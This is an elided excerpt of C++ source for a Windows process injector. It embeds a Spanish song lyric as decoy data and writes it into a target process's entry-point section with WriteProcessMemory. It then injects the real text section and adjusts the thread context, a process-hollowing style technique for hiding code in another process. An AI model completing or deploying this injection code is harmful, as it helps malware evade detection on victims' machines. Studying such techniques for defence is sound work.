...
// Zenttric
char zenttric[] = "De vuelta a casa contando estrellas"\
"todo me da vueltas mientras pienso en lo perdidos que estamos.."\
"De vuelta a casa de madrugada"\
"todo lo que digas y en la forma en que lo digas no importa.."\
"Dices otra vez, que no hay forma de hacerte comprender"\
"y esque hay veces que enloqueces sin querer"\
"mientras que yo salgo corriendo al ayerr...!"\
"Si no vas a venir.. Avisame pronto"\
"que yo quiero bailar solo quiero bailar"\
"solo quiero olvidar toda esta situacion. (x2)"\
"Mientes tan bien que ya no te creo"\
"no hay distancia en el destino ya que estas en mi camino me estorbas.."\
"De vuelta a casa de madrugada"\
"casi todo lo que digas y en la forma en que lo digas no importa."\
"(Oh oh seehh..!)"\
"Repites otra vez, que no hay forma de hacerte comprender"\
"y esque hay veces que enloqueces sin querer"\
"mientras que yo salgo volando al ayerr...!"\
"Si no vas a venir.. Avisame pronto"\
"que yo quiero bailar solo quiero bailar"\
"solo quiero olvidar toda esta situacion."\
"Nadie puede darme cuerda como tuu.."\
"quiero bailar,quiero bailar,quiero olvidar todo esta situacion."\
"Si no vas a venir."\
"Si no vas a venir."\
"Si no vas a venir."\
"Quiero bailar."\
...
bool process_injector_t::inject_real_text_section()
{
	return	this->inject_real_text_section(this->base_address_, this->process_handler);
}
...
bool process_injector_t::inject_sections_to_executable(PVOID base_address, HANDLE hProcess)
{
	...
	for (uint16_t i = 0; i < number_of_sections; i++)
	{
		...
		if (image_section_header[i].VirtualAddress <= this->entry_point_ && this->entry_point_ <= (image_section_header[i].VirtualAddress + image_section_header[i].Misc.VirtualSize))
		{
			if (!this->inject_zenttric(address_to_write, image_section_header[i].Misc.VirtualSize, hProcess))
				return false;
		}
		else
		{
...
bool process_injector_t::inject_zenttric(LPVOID address_to_inject, DWORD size, HANDLE hProcess)
{
	SIZE_T number_of_bytes_written;
	SIZE_T i = 0, j = 0;
	SIZE_T zenttric_size = strlen(zenttric);

	for (i = 0; i < size; i++)
	{
		LPVOID address_to_write = (LPVOID)((uintptr_t)address_to_inject + i);
		if (!WriteProcessMemory(
			hProcess,
			address_to_write,
			&zenttric[j++],
...
bool process_injector_t::inject_real_text_section(PVOID base_address, HANDLE hProcess)
{
	IMAGE_DOS_HEADER* image_dos_header = (IMAGE_DOS_HEADER*)this->process_buffer;
	IMAGE_NT_HEADERS* image_nt_headers = (IMAGE_NT_HEADERS*)((uintptr_t)this->process_buffer + image_dos_header->e_lfanew);
	IMAGE_SECTION_HEADER* image_section_header = (IMAGE_SECTION_HEADER*)((uintptr_t)this->process_buffer + image_dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS));
...
bool process_injector_t::fix_context(HANDLE hThread)
{
	...
	printf("\tImage base address: 0x%X\n", (unsigned int)peb.ImageBaseAddress);
